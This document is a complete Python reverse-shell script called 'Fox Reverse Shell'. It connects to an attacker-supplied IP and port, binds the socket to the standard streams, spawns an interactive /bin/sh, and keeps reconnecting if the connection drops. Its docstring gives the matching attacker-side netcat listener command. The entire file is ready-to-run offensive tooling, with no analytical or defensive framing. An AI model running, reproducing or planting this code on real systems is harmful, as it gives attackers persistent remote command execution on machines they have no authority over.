#!/usr/bin/env python3
"""
Fox Reverse Shell — Python with auto-reconnect
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Usage:
  # Attacker: nc -lvnp 4444
  # Target:   python3 fox-revshell.py --host 10.0.0.1 --port 4444
"""

import sys
import os
import socket
import subprocess
import argparse
import time
import threading


def reverse_shell(host: str, port: int, reconnect: bool = True, reconnect_delay: int = 5):
    """Connect to attacker and spawn interactive shell."""
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(30)
            sock.connect((host, port))
            sock.settimeout(None)

            # Upgrade to interactive shell
            os.dup2(sock.fileno(), 0)
            os.dup2(sock.fileno(), 1)
            os.dup2(sock.fileno(), 2)

            # Spawn shell
            subprocess.call(["/bin/sh", "-i"])

            sock.close()
        except (socket.timeout, ConnectionRefusedError, BrokenPipeError, OSError) as e:
            if not reconnect:
                print(f"[!] Connection failed: {e}")
                break
            time.sleep(reconnect_delay)
            continue
        except KeyboardInterrupt:
            break

        if not reconnect:
            break

        time.sleep(reconnect_delay)


def main():
    parser = argparse.ArgumentParser(description="Fox Reverse Shell")
    parser.add_argument("--host", required=True, help="Attacker IP")
    parser.add_argument("--port", type=int, required=True, help="Attacker port")
    parser.add_argument("--no-reconnect", action="store_true", help="Disable auto-reconnect")
    parser.add_argument("--delay", type=int, default=5, help="Reconnect delay (seconds)")
    args = parser.parse_args()

    print(f"[*] Fox Reverse Shell connecting to {args.host}:{args.port}...")
    reverse_shell(args.host, args.port, reconnect=not args.no_reconnect, reconnect_delay=args.delay)


if __name__ == "__main__":
    main()
